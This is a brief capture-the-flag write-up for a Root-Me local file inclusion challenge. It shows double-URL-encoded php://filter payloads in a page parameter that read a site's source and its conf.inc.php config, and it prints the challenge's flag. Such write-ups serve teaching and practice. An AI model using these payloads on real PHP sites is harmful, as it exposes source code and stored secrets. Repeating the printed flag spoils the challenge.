# [Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)

We see links with the url `?page=cv`

If we recall in the "PHP Filters" challenge, we could get the source code of a file with:

`php://filter/convert.base64-encode/resource=cv`

> Attack detected!

[Read this](https://www.owasp.org/index.php/Double_Encoding)

Let's `urlencode()` that.

`php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dcv`

And `urlencode()` again (ie double encoding).

`php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dcv`

And now let's include that in our url:

`page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dcv`

Great we got the base64 encoded source of `cv`. Now decode it and read it.

We see a config file `conf.inc.php`

Let's read that source.

`page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dconf`

We see the flag!

` "flag"        => "Th1sIsTh3Fl4g!",`

Flag is: **Th1sIsTh3Fl4g!**
